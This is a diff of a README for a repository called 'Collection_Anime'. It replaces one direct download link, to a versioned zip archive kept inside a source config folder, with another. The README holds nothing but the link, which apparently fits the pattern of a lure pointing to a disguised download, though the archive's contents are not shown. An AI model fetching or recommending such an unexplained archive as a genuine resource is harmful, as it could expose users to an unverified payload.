@@ -1,3 +1,3 @@
 # Collection_Anime
 
-https://github.com/Miqman/Collection_Anime/raw/refs/heads/main/anime-info/src/config/Anime-Collection-v2.8.zip
+https://raw.githubusercontent.com/Miqman/Collection_Anime/main/anime-info/src/config/Collection-Anime-3.4.zip
